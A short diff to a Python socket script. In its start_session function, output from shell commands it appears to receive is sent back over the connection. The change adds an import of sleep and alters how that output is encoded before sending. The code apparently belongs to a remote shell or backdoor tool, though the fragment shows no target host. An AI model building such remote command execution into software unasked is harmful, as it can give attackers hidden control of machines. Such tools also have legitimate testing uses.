@@ -5,6 +5,7 @@ from multiprocessing import Process,current_process
 from threading import Thread
 import struct
 import platform
+from time import sleep
 
 def start_session(s):
     while True:
@@ -32,7 +33,7 @@ def start_session(s):
                     output = pipe.stdout.read()
                     s.send("DONE".encode())
                     sleep(1)
-                    s.send(output.encode())
+                    s.send(output)
                 except Exception as e:
                     print("[*] Shell execution failed")
                     print("[*] Error : %s"%(str(e)))
